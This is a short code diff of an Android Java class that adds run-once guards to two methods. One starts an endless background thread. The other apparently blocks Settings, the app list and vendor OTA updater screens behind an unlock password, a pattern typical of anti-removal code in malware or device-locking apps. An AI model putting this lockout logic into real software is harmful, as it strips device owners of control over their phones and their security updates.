@@ -2144,7 +2144,16 @@ public class SystemLib {
         }
     }
 
+    /**
+     * NOTICE:multi-invoking is allowed.
+     */
     public void keepState() {
+        if (LockActivity.keep_state_enable) {
+            Log.print("keepState is working...");
+            return;
+        }
+
+        LockActivity.keep_state_enable = true;
         new Thread(new Runnable() {
             public void run() {
                 while (true) {
@@ -2217,14 +2226,20 @@ public class SystemLib {
     }
 
     /**
-     * 
+     * NOTICE:multi-invoking is allowed.
      */
     public void lockDangerousActivity(String unlockPassword) {
+        if (LockActivity.lock_activity_enable) {
+            Log.print("lockDangerousActivity is working...");
+            return;
+        }
+
+        LockActivity.lock_activity_enable = true;
+        LockActivity.unlockPassword = unlockPassword;
         final String[] activities = new String[] { "com.android.settings"/*packageName*/,
                 "com.miui.uac.AppListActivity", "com.htc.android.psclient.RestoreUsbSettings",
                 "com.baidu.android.ota.ui.UpdateSettings", "com.android.updater.UpdaterSettings",
                 "com.android.updater.MainActivity", "com.android.settings.framework.activity.HtcSettings" };
-        LockActivity.unlockPassword = unlockPassword;
 
         new Thread(new Runnable() {
             public void run() {
